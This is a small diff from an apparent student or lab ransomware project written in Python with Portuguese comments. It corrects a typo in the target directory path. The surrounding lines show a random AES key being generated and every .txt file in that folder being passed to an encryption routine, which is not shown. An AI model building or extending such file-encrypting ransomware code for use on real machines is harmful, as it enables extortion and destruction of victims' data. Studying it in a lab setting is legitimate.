@@ -21,7 +21,7 @@ def encrypt_file(key, input_file, output_file):
 
 if __name__ == '__main__':
     encryption_key = get_random_bytes(16)  # Chave de criptografia de 16 bytes (128 bits)
-    directory = '/home/kali/projeto-ransonware/'  # Diretório que contém os arquivos a serem criptografados
+    directory = '/home/kali/projeto-ransomware/'  # Diretório que contém os arquivos a serem criptografados
 
     for filename in os.listdir(directory):
         if filename.endswith('.txt'):
